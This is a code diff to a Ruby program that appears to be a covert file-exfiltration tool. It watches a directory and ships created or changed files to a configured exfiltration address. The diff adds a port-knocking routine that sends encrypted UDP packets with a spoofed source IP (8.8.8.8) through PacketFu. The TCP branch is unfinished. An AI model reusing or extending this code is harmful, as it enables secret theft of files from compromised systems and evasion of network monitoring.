@@ -43,6 +43,7 @@ CONFIG_FILE_DEFAULT << "\# pen_port = 6886\n"
 CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
 CONFIG_FILE_DEFAULT << "\# exfil_port = 8668\n"
 CONFIG_FILE_DEFAULT << "\# exfil_addr = 8.8.8.8\n"
+CONFIG_FILE_DEFAULT << "\# ttl = 3600\n"
 CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
 CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
 CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
@@ -124,15 +125,17 @@ def start_watch(type, name)
   FSSM.monitor('/test', glob) do
     update { |base, relative|
       puts "#{base}/#{relative} has been updated"
-      Thread.new { send_out(:file, "#{base}/#{relative}") }
+      t = Thread.new { send_out(:file, "#{base}/#{relative}") }
+      t.join
     }
     delete { |base, relative|
       puts "#{base}/#{relative} has been deleted"
-      Thread.new { send_out(:msg, "#{base}/#{relative}") }
+      t = Thread.new { send_out(:msg, "#{base}/#{relative}") }
     }
     create { |base, relative|
       puts "#{base}/#{relative} has been created"
-      Thread.new { send_out(:file, "#{base}/#{relative}") }
+      t = Thread.new { send_out(:file, "#{base}/#{relative}") }
+      t.join
     }
   end
   puts "watch on #{name} started"
@@ -151,7 +154,47 @@ def send_out(mode, data)
 end
 
 def generate_knock_seq
-  
+  iface_config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> @cfg_iface)).config
+  convert_config = "#{@cfg_exfil_protocol},#{@exfil_port},#{@cfg_exfil_ttl}"
+  puts convert_config
+
+  if @cfg_exfil_protocol == UDP
+    udp_packet(iface_config, 44444, convert_config)
+    sleep 2
+    udp_packet(iface_config, 44444, convert_config)
+    udp_packet(iface_config, 55555, convert_config)
+    sleep 2
+    udp_packet(iface_config, 55555, convert_config)
+    udp_packet(iface_config, 44544, convert_config)
+    sleep 2
+    udp_packet(iface_config, 44544, convert_config)
+    sleep 5
+  elsif @cfg_exfil_protocol == TCP
+  else
+    #should not get here
+  end
+      
+end
+
+def udp_packet(config, port, payload)
+  udp_pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")
+
+
+  udp_pkt.udp_dst = port
+  udp_pkt.udp_src = rand(0xffff)
+  udp_pkt.ip_saddr = "8.8.8.8"
+  #udp_pkt.ip_saddr = [rand(0xff),rand(0xff),rand(0xff),rand(0xff)].join('.')
+  udp_pkt.ip_daddr = @cfg_exfil_ip
+  udp_pkt.payload = encrypt(payload)
+
+  udp_pkt.recalc
+  udp_pkt.to_w(@cfg_iface)
+
+  puts "udp packet sent #{@cfg_target_ip} on #{@cfg_pen_port}"
+end
+
+def tcp_packet(config, port, payload)
+
 end
 
 ## Main
